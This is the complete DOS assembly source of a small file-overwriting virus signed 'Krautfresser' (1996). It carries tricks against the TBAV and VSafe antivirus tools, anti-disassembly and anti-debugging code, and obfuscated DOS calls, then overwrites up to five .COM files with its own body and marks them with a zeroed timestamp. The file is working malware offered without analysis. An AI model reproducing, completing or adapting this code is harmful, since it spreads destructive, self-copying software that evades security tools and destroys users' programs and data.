.model tiny
.code
org 100h


start_virus:
and al,21h

mov cx,100h                     ;for tha tbav
abc:                            ;
loop abc                        ;

                               ;anti_disassembler
mov cx,09ebh
mov ax,0fe05h
jmp $-2
add ah,03bh
jmp $-10

                                ;anti_debugger
mov ax,3503h                    ;save int 3h in bx
int 21h                         ;do it
mov ah,25h                      ;set new int 3h...
mov dx,offset new_int_3         ;...to new_int_3
int 21h                         ;do it
xchg bx,dx                      ;exchange bx,dx (restore original int 3h)
int 21h                         ;do it


                                ;anti_vsafe
mov ax,0f9f2h
add ax,10h
mov dx,5935h
add dx,10h
mov bl,10h
sub bl,10h
int 16h



mov ah,5eh                      ;find first
sub ah,10h

mov cx,5h                       ;5 files to infect
push cx

jmp jojo                        ;go ta jojo
find_next:
push cx
mov ah,5fh                      ;find next
sub ah,10h
jojo:
xor cx,cx                       ;attribut normal
mov dx,offset star_dot_com      ;*.COM
int 21h                         ;do it
jb ende_virus                   ;no more filz -> ende_virus

mov ax,3d02h                    ;open file
mov dx,9eh                      ;file name
int 21h                         ;do it

mov bx,ax                       ;move file handler in bx

mov ax,5700h                    ;get file time
int 21h                         ;do it

cmp cx,0000h                    ;if file time = 0 then infect it
je prepare_for_new              ;else goto prepare_for_new file search

mov ah,50h                      ;write file (infect it)
sub ah,10h
mov cx,offset fin - offset start_virus  ;virus size
mov dx,offset start_virus       ;begin at start
int 21h                         ;do it

mov ax,5701h                    ;set infected file time
mov cx,0000h                    ;to 0000
int 21h                         ;do it

mov ah,3eh                      ;close file
int 21h                         ;do it

pop cx
push cx
loop find_next                   ;look for tha next file to infect

ende_virus:
int 20h                         ;-> exit

prepare_for_new:                ;prepare for the next file search
mov ah,3eh                      ;close file
int 21h                         ;do it
pop cx
jmp find_next                   ;goto find_next file


new_int_3:                      ;new interrupt 3h
mov ah,9h                       ;write string to standard output
mov dx,offset autor             ;[easyman written by spooky]
int 21h                         ;do it
mov ah,00h                      ;wait until keypressed
int 16h                         ;do it
int 20h                         ;-> terminate debugging


autor:  db '[Krautfresser written by Spooky]',0dh,0ah        ;copyright
        db '       1996 Austria',0dh,0ah,'$'
star_dot_com: db '*.com',0      ;filespec
fin:
end start_virus
